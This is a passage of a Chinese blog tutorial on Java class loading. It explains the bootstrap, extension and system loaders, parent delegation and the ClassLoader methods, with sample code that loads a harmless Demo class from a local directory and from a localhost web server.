id="根类加载器-Bootstrap"><a href="#根类加载器-Bootstrap" class="headerlink" title="根类加载器(Bootstrap)"></a>根类加载器(Bootstrap)</h6><p>根类加载器是最底层的类加载器，是虚拟机的一部分。它是由C++语言实现的，且没有父加载器，也没有继承<code>java.lang.ClassLoader</code>类。它主要负责加载由系统属性<code>sun.boot.class.path</code>指定的路径下的核心类库，出于安全考虑，根类加载器只加载<code>java、javax、sun</code>开头的类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">  ClassLoader cl = Object<span class="class">.<span class="keyword">class</span>.<span class="title">getClassLoader</span>()</span>;</span><br><span class="line">  System.out.println(cl); <span class="comment">//根类加载器打印出来的结果是null</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里是打印出<code>null</code>的原因是由于<code>BootStrapClassLoader</code>是用c++写的，使用原生代码来实现，并不继承于<code>java.lang.ClassLoader</code>，所以在返回该<code>ClassLoader</code>时就会返回<code>null</code>。</p><h6 id="扩展类加载器-Extension"><a href="#扩展类加载器-Extension" class="headerlink" title="扩展类加载器(Extension)"></a>扩展类加载器(Extension)</h6><p>扩展类加载器是指原SUN公司实现的<code>sun.misc.launcher$ExtClassLoader</code>类(JDK8)，它是由java语言编写，父加载器是根类加载器，负责加载<code>&lt;JAVA_HOME&gt;\jre\lib\ext</code>目录下的类库或者系统变量<code>java.ext.dirs</code>指定的目录下的类库。</p><p>测试<code>dnsns.jar</code>下类的类加载器，因为该<code>jar</code>包在<code>jre\lib\ext</code>目录下</p><p><img src="/2021/10/30/Java类加载/2.png" alt="2"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ClassLoader classLoader1 = DNSNameService<span class="class">.<span class="keyword">class</span>.<span class="title">getClassLoader</span>()</span>;</span><br><span class="line">        System.out.println(<span class="string">"DNSNameService类的类加载器是: "</span>+classLoader1);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/10/30/Java类加载/3.png" alt="3"></p><h6 id="系统类加载器-System"><a href="#系统类加载器-System" class="headerlink" title="系统类加载器(System)"></a>系统类加载器(System)</h6><p>系统类加载器也称之为应用类加载器，也是纯Java类，是原SUN公司实现的<code>sun.misc.Launcher$AppClassLoader</code>类(JDK8)。它的父加载器是扩展类加载器，它负责从<code>classpath</code>环境变量或者系统属性<code>java.class.path</code>所指定的目录中加载类，它是用户自定义的类加载器的默认父加载器。一般情况下，该类加载器是程序中默认的类加载器，可以通过<code>ClassLoader.getSystemClassLoader()</code>直接获得</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassLoaderTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ClassLoader classLoader1 = ClassLoaderTest<span class="class">.<span class="keyword">class</span>.<span class="title">getClassLoader</span>()</span>;</span><br><span class="line">        System.out.println(<span class="string">"ClassLoaderTest类的类加载器是: "</span>+classLoader1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>自己编写的类使用的类加载器结果为<code>sun.misc.Launcher$AppClassLoader</code></p><h5 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h5><p>在程序开发中，类的加载几乎是由上述3种类加载器相互配合执行的，同时我们还可以自定义类加载器。需要注意的是，Java虚拟机对<code>class</code>文件采用的是按需加载的方式，也就是说当需要使用该类时才会将它的<code>class</code>文件加载到内存生成<code>class</code>对象，而且加载某个类的<code>class</code>文件时，Java虚拟机采用的是双亲委派模式，即把加载类的请求交由父加载器处理，它是一种任务委派模式。</p><h4 id="类加载器的双亲委派机制"><a href="#类加载器的双亲委派机制" class="headerlink" title="类加载器的双亲委派机制"></a>类加载器的双亲委派机制</h4><p>除了根类加载器之外，其他的类加载器都需要有自己的父加载器。从<code>JDK1.2</code>开始，类的加载过程采用双亲委派机制，这种机制能够很好的保护Java程序的安全，除了虚拟机自带的根类加载器之外，其余的类加载器都有唯一的父加载器，比如，如果需要<code>ClassLoader</code>加载一个类时，该<code>ClassLoader</code>先委托自己的父加载器先去加载这个类，若父加载器能够加载，则由父加载器加载，否则才由<code>ClassLoader</code>自己加载这个类。真正加载类的加载器我们叫做启动类加载器，注意，双亲委派机制的父子关系并非面向对象程序设计中的继承关系，而是通过使用组合模式来复用父加载器代码，这种机制如下图所示</p><p><img src="/2021/10/30/Java类加载/4.png" alt="4"></p><p>测试自定义类的类加载器的父子关系，通过<code>getParent()</code>来获取父类加载器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassLoaderTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ClassLoader classLoader = ClassLoaderTest<span class="class">.<span class="keyword">class</span>.<span class="title">getClassLoader</span>()</span>;</span><br><span class="line">        System.out.println(<span class="string">"ClassLoaderTest类的类加载器是: "</span>+classLoader);</span><br><span class="line">        <span class="keyword">while</span> (classLoader!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            System.out.println(classLoader);</span><br><span class="line">            classLoader = classLoader.getParent();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>打印出的结果为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ClassLoaderTest类的类加载器是: sun.misc.Launcher$AppClassLoader</span><br><span class="line">sun.misc.Launcher$AppClassLoader</span><br><span class="line">sun.misc.Launcher$ExtClassLoader</span><br></pre></td></tr></table></figure><h5 id="双亲委派机制的好处"><a href="#双亲委派机制的好处" class="headerlink" title="双亲委派机制的好处"></a>双亲委派机制的好处</h5><ul><li>可以避免类的重复加载，当父类加载器已经加载了该类时，就没有必要子<code>ClassLoader</code>再加载一次。</li><li>考虑到安全因素，Java核心<code>API</code>种定义类型不会被随意替换，假设通过网络传递一个名为<code>java.lang.Object</code>的类，通过双亲委派模式传递到启动类加载器，而启动类加载器在Java核心<code>API</code>发现这个名字的类，发现该类已经被加载，并不会重新加载网络传递过来的<code>java.lang.Object</code>，而直接返回已加载过的<code>Objec.class</code>，这样便可以防止核心<code>API</code>库被随意篡改。</li></ul><h4 id="ClassLoader"><a href="#ClassLoader" class="headerlink" title="ClassLoader"></a>ClassLoader</h4><p>所有的类加载器(除了根类加载器)都必须继承<code>java.lang.ClassLoader</code>，它是一个抽象类，主要的方法如下</p><h5 id="loadClass"><a href="#loadClass" class="headerlink" title="loadClass"></a>loadClass</h5><p>在<code>ClassLoader</code>的源码中，有一个方法<code>loadClass(String name, boolean resolve)</code>，这里就是双亲委派模式的代码实现。从源码中我们可以观察到它的执行顺序，需要注意的是，只有父类加载器加载不到类时，会调用<code>findClass</code>方法进行类的查找，所以在定义自己的类加载器时，不要覆盖掉该方法，而应该覆盖掉<code>findClass</code>方法。</p><p><code>ClassLoader</code>类的<code>loadClass</code>源码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; loadClass(String name, <span class="keyword">boolean</span> resolve)</span><br><span class="line">    <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">synchronized</span> (getClassLoadingLock(name)) &#123;</span><br><span class="line">        <span class="comment">// First, check if the class has already been loaded</span></span><br><span class="line">        Class&lt;?&gt; c = findLoadedClass(name);</span><br><span class="line">        <span class="keyword">if</span> (c == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">long</span> t0 = System.nanoTime();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (parent != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    c = parent.loadClass(name, <span class="keyword">false</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    c = findBootstrapClassOrNull(name);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">                <span class="comment">// ClassNotFoundException thrown if class not found</span></span><br><span class="line">                <span class="comment">// from the non-null parent class loader</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (c == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="comment">// If still not found, then invoke findClass in order</span></span><br><span class="line">                <span class="comment">// to find the class.</span></span><br><span class="line">                <span class="keyword">long</span> t1 = System.nanoTime();</span><br><span class="line">                c = findClass(name);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// this is the defining class loader; record the stats</span></span><br><span class="line">                sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0);</span><br><span class="line">                sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1);</span><br><span class="line">                sun.misc.PerfCounter.getFindClasses().increment();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (resolve) &#123;</span><br><span class="line">            resolveClass(c);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在源码中，首先会通过<code>findLoadClass</code>方法检查类是否已经被加载。如果没有被加载，就会执行双亲委派模式，通过父类去加载，即在父类上调用<code>loadClass</code>方法，如果父类加载不到的话，则使用虚拟机的内置类加载器，如果都没有加载成功，就会通过自己的<code>findClass</code>方法去加载。</p><h5 id="findClass"><a href="#findClass" class="headerlink" title="findClass"></a>findClass</h5><p>在自定义类加载器时，一般我们需要覆盖这个方法，且<code>ClassLoader</code>中给出了一个默认的错误实现。如果我们覆盖了这个方法，则会调用我们自己写的方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> ClassNotFoundException(name);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h5 id="defineClass"><a href="#defineClass" class="headerlink" title="defineClass"></a>defineClass</h5><p>该方法用来将<code>byte</code>字节解析成虚拟机能够识别的<code>Class</code>对象，<code>defineClass()</code>方法通常与<code>findClass()</code>方法一起使用。在自定义类加载器时，会直接覆盖<code>ClassLoader</code>的<code>findClass()</code>方法获取要加载类的字节码，然后调用<code>defineClass()</code>方法生成<code>Class</code>对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Class&lt;?&gt; defineClass(String name, <span class="keyword">byte</span>[] b, <span class="keyword">int</span> off, <span class="keyword">int</span> len)</span><br><span class="line">        <span class="keyword">throws</span> ClassFormatError</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> defineClass(name, b, off, len, <span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h5 id="resolveClass"><a href="#resolveClass" class="headerlink" title="resolveClass"></a>resolveClass</h5><p>连接指定的类，类加载器可以使用此方法来连接类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">resolveClass</span><span class="params">(Class&lt;?&gt; c)</span> </span>&#123;</span><br><span class="line">        resolveClass0(c);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h4 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h4><p>在<code>java.net</code>包中，JDK提供了一个更加易用的类加载器<code>URLClassLoader</code>，它扩展了<code>ClassLoader</code>，能够从本地或者网络上指定的位置加载类，我们可以使用该类作为自定义的类加载器使用。</p><p>构造方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">URLClassLoader</span><span class="params">(URL[] urls)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        <span class="comment">// this is to make the stack depth consistent with 1.1</span></span><br><span class="line">        SecurityManager security = System.getSecurityManager();</span><br><span class="line">        <span class="keyword">if</span> (security != <span class="keyword">null</span>) &#123;</span><br><span class="line">            security.checkCreateClassLoader();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">this</span>.acc = AccessController.getContext();</span><br><span class="line">        ucp = <span class="keyword">new</span> URLClassPath(urls, acc);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>指定要加载的类所在的URL地址，父类加载器默认认为系统类加载器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">URLClassLoader</span><span class="params">(URL[] urls, ClassLoader parent)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(parent);</span><br><span class="line">        <span class="comment">// this is to make the stack depth consistent with 1.1</span></span><br><span class="line">        SecurityManager security = System.getSecurityManager();</span><br><span class="line">        <span class="keyword">if</span> (security != <span class="keyword">null</span>) &#123;</span><br><span class="line">            security.checkCreateClassLoader();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">this</span>.acc = AccessController.getContext();</span><br><span class="line">        ucp = <span class="keyword">new</span> URLClassPath(urls, acc);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>指定要加载的类所在的URL地址，并指定父类加载器。</p><h5 id="使用URLClassLoader加载本地类"><a href="#使用URLClassLoader加载本地类" class="headerlink" title="使用URLClassLoader加载本地类"></a>使用URLClassLoader加载本地类</h5><p>创建一个<code>Demo</code>类如下，路径为<code>/Users/caoyifan/</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> elssm.test;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo</span></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Demo</span><span class="params">()</span></span>&#123;</span><br><span class="line">System.out.println(<span class="string">"demo instance"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译该类</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac -d . Demo.java</span><br></pre></td></tr></table></figure><p>接着使用自己写的类去加载<code>Demo</code>类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.net.URI;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassLoaderDemo2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        File file = <span class="keyword">new</span> File(<span class="string">"/Users/caoyifan/"</span>);</span><br><span class="line">        URI uri = file.toURI();</span><br><span class="line">        URL url = uri.toURL();</span><br><span class="line"></span><br><span class="line">        URLClassLoader classLoader = <span class="keyword">new</span> URLClassLoader(<span class="keyword">new</span> URL[]&#123;url&#125;);</span><br><span class="line">        System.out.println(<span class="string">"父类加载器："</span>+classLoader.getParent());</span><br><span class="line">        Class&lt;?&gt; clazz = classLoader.loadClass(<span class="string">"elssm.test.Demo"</span>);</span><br><span class="line">        clazz.newInstance();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">父类加载器：sun.misc.Launcher$AppClassLoader@<span class="number">7f</span>31245a</span><br><span class="line">demo instance</span><br></pre></td></tr></table></figure><h5 id="使用URLClassLoader加载网络上的类"><a href="#使用URLClassLoader加载网络上的类" class="headerlink" title="使用URLClassLoader加载网络上的类"></a>使用URLClassLoader加载网络上的类</h5><p>Mac上Apache服务器默认的web根目录在：<code>/Library/WebServer/Documents</code>，我们可以将<code>Demo</code>；类放在该目录下进行加载</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassLoaderDemo3</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        URL url = <span class="keyword">new</span> URL(<span class="string">"http://localhost:80/"</span>);</span><br><span class="line">        URLClassLoader classLoader = <span class="keyword">new</span> URLClassLoader(<span class="keyword">new</span> URL[]&#123;url&#125;);</span><br><span class="line">        Class&lt;?&gt; clazz = classLoader.loadClass(<span class="string">"elssm.test.Demo"</span>);</span><br><span class="line">        clazz.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="自定义类加载器"><a href="#自定义类加载器" class="headerlink" title="自定义类加载器"></a>自定义类加载器</h4><h5 id="自定义文件类加载器"><a href="#自定义文件类加载器" class="headerlink" title="自定义文件类加载器"></a>自定义文件类加载器</h5><ul><li>继承<code>ClassLoader</code>类</li><li>覆盖<code>findClass</code>方法</li></ul><p>具体实现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyFileClassLoader</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String directory;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyFileClassLoader</span><span class="params">(String directory)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.directory = directory;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyFileClassLoader</span><span class="params">(String directory,ClassLoader parent)</span></span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(parent);</span><br><span class="line">        <span class="keyword">this</span>.directory = directory;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//把类名转换为目录</span></span><br><span class="line">            String file = directory + File.separator+name.replace(<span class="string">"."</span>,File.separator)+<span class="string">".class"</span>;</span><br><span class="line">            <span class="comment">//构建输入流</span></span><br><span class="line">            InputStream in = <span class="keyword">new</span> FileInputStream(file);</span><br><span class="line">            <span class="comment">//构建字节输出流</span></span><br><span class="line">            ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">            <span class="keyword">byte</span> buf[] = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="keyword">int</span> len = -<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span>((len = in.read(buf))!= -<span class="number">1</span>)&#123;</span><br><span class="line">                baos.write(buf,<span class="number">0</span>,len);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">byte</span> data[] = baos.toByteArray(); <span class="comment">//读取到的字节码的二进制数据</span></span><br><span class="line">            in.close();</span><br><span class="line">            baos.close();</span><br><span class="line">            <span class="keyword">return</span> defineClass(name,data,<span class="number">0</span>,data.length);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        MyFileClassLoader classLoader = <span class="keyword">new</span> MyFileClassLoader(<span class="string">"/Users/caoyifan/"</span>);</span><br><span class="line">        Class clazz = classLoader.loadClass(<span class="string">"elssm.test.Demo"</span>);</span><br><span class="line">        clazz.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="自定义网络类加载器"><a href="#自定义网络类加载器" class="headerlink" title="自定义网络类加载器"></a>自定义网络类加载器</h5><p>具体实现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyURLClassLoader</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String url;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyURLClassLoader</span><span class="params">(String url)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.url = url;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String path = url+<span class="string">"/"</span>+name.replace(<span class="string">"."</span>,<span class="string">"/"</span>)+<span class="string">".class"</span>;</span><br><span class="line">            URL url = <span class="keyword">new</span> URL(path);</span><br><span class="line">            InputStream in = url.openStream();</span><br><span class="line">            ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">            <span class="keyword">byte</span> buf[] = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="keyword">int</span> len = -<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span> ((len=in.read(buf))!=-<span class="number">1</span>)&#123;</span><br><span class="line">                baos.write(buf,<span class="number">0</span>,len);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">byte</span>[] data = baos.toByteArray();</span><br><span class="line">            in.close();</span><br><span class="line">            baos.close();</span><br><span class="line">            <span class="keyword">return</span> defineClass(name,data,<span class="number">0</span>,data.length);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        MyURLClassLoader classLoader = <span class="keyword">new</span> MyURLClassLoader(<span class="string">"http://localhost:80"</span>);</span><br><span class="line">        Class&lt;?&gt; clazz = classLoader.loadClass(<span class="string">"elssm.test.Demo"</span>);</span><br><span class="line">   